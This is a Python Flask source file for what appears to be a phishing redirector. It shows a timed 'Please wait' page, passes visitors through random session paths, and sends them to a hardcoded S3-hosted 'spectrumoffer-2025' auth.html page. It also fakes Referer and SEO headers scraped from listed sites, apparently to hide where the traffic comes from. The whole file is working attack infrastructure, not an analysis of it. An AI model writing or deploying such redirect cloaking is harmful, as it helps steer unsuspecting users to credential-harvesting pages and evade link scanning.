from flask import Flask, redirect, request, render_template_string, session
import random
import requests
import string
import time
from bs4 import BeautifulSoup

app = Flask(__name__)
app.secret_key = ''.join(random.choices(string.ascii_letters + string.digits, k=32))

destination_url = "https://spectrumoffer-2025.s3.us-east-1.amazonaws.com/auth.html"  # Hardcoded destination URL

# HTML template for delay page
DELAY_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
    <meta http-equiv="refresh" content="3;url=/app">
    <style>
        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader { text-align: center; }
    </style>
</head>
<body>
    <div class="loader">
        <h2>Please wait...</h2>
        <p>Redirecting in 3 seconds...</p>
    </div>
</body>
</html>
'''

# Load SEO websites from file
with open("seo.txt", "r") as f:
    seo_websites = [line.strip() for line in f.readlines() if line.strip()]

def fetch_seo_metadata(url):
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        title = soup.title.string if soup.title else ""
        meta_desc = ""
        meta_tag = soup.find("meta", attrs={"name": "description"})
        if meta_tag:
            meta_desc = meta_tag.get("content", "")
        return title, meta_desc
    except Exception:
        return "", ""

def generate_session_id():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=16))

@app.route('/')
def initial_redirect():
    seo_source = random.choice(seo_websites)
    title, meta_desc = fetch_seo_metadata(seo_source)
    session['seo_source'] = seo_source
    session['seo_title'] = title
    session['seo_desc'] = meta_desc
    return render_template_string(DELAY_TEMPLATE)

@app.route('/app')
def app_redirect():
    session_id = generate_session_id()
    return redirect(f'/app/{session_id}', code=302)

@app.route('/app/<session_id>')
def final_redirect(session_id):
    seo_source = session.get('seo_source', random.choice(seo_websites))
    title = session.get('seo_title', '')
    meta_desc = session.get('seo_desc', '')
    
    response = redirect(destination_url, code=302)
    response.headers['Referer'] = seo_source
    response.headers['User-Agent'] = request.headers.get('User-Agent', '')
    response.headers['X-SEO-Title'] = title
    response.headers['X-SEO-Description'] = meta_desc
    return response

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
